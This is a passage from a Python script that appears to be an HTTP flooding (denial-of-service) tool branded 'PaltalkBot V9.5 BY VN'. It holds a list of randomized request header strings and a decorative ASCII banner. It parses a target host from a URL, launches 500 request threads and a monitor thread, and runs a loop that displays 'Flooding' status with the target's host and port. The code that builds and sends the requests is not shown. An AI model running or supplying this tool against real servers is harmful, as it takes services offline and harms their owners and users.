    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nContent-Type: application/json\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\nContent-Type: application/x-www-form-urlencoded\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nContent-Type: application/x-www-form-urlencoded\r\n",] 
nload = 1
x = 0
def logo1():
    if sys.platform.startswith("linux"):
        os.system('clear')
    elif sys.platform.startswith("freebsd"):
        os.system('clear')
    else:
        os.system('color  ' +random.choice(['A', 'B', 'C', 'D', 'E', 'F'])+ " & cls & title PaltalkBot V9.5 BY VN")
    print(Fore.CYAN +
"""
EEEEEEEEEEEEEEEEEEEEEE                   jjjj                                         
E::::::::::::::::::::E                  j::::j                                        
E::::::::::::::::::::E                   jjjj                                         
EE::::::EEEEEEEEE::::E                                                                
  E:::::E       EEEEEEnnnn  nnnnnnnn   jjjjjjj   ooooooooooo yyyyyyy           yyyyyyy
  E:::::E             n:::nn::::::::nn j:::::j oo:::::::::::ooy:::::y         y:::::y 
  E::::::EEEEEEEEEE   n::::::::::::::nn j::::jo:::::::::::::::oy:::::y       y:::::y  
  E:::::::::::::::E   nn:::::::::::::::nj::::jo:::::ooooo:::::o y:::::y     y:::::y   
  E:::::::::::::::E     n:::::nnnn:::::nj::::jo::::o     o::::o  y:::::y   y:::::y    
  E::::::EEEEEEEEEE     n::::n    n::::nj::::jo::::o     o::::o   y:::::y y:::::y     
  E:::::E               n::::n    n::::nj::::jo::::o     o::::o    y:::::y:::::y      
  E:::::E       EEEEEE  n::::n    n::::nj::::jo::::o     o::::o     y:::::::::y       
EE::::::EEEEEEEE:::::E  n::::n    n::::nj::::jo:::::ooooo:::::o      y:::::::y        
E::::::::::::::::::::E  n::::n    n::::nj::::jo:::::::::::::::o       y:::::y         
E::::::::::::::::::::E  n::::n    n::::nj::::j oo:::::::::::oo       y:::::y          
EEEEEEEEEEEEEEEEEEEEEE  nnnnnn    nnnnnnj::::j   ooooooooooo        y:::::y           
                                        j::::j                     y:::::y            
                              jjjj      j::::j                    y:::::y             
                             j::::jj   j:::::j                   y:::::y              
                             j::::::jjj::::::j                  y:::::y               
                              jj::::::::::::j                  yyyyyyy                
                                jjj::::::jjj                                          
                                   jjjjjj                                             
=========================[+]Please wait a moment[+]=============================""")
logo3()
start_mode()
logo1()
if url.count("/")==2:
    url = url + "/"
    m = re.search('http\://([^/]*)/?.*', url)
    host = m.group(1)
for x in xrange(500):
 t = HTTPThread()
 t.start()
t = MonitorThread()
t.start()
nload = 0
while True:    
    key = [Fore.LIGHTRED_EX +" looding","Flooding","F ooding","Flooding","Fl oding","Flooding","Flo ding","Flooding","Floo ing","Flooding","Flood ng","Flooding","Floodi g","Flooding","Floodin ","Flooding" + Fore.LIGHTYELLOW_EX] 
    key1 = ["-","\\","|","/","-","\\","|","/","-","\\","|","/","-","\\","|","/","-","\\","|","/","-"]
    try:
        if x>=16:
            x = 0
        time.sleep(0.1)
        sys.stdout.write(" ["+str(key1[x])+"]"+str(key[x])+"     | "+host_url+":"+str(port)+" | Thread: "+str(thread)+" | Mode: "+str(filemode)+" "+str(filemode2)+"\r")
        sys.stdout.flush()
        x +=1
    except KeyboardInterrupt:
        sys.stdout.write("\n")
        sys.stdout.flush()
        os._exit(0)
        break
        
while not nload:
    time.sleep(1)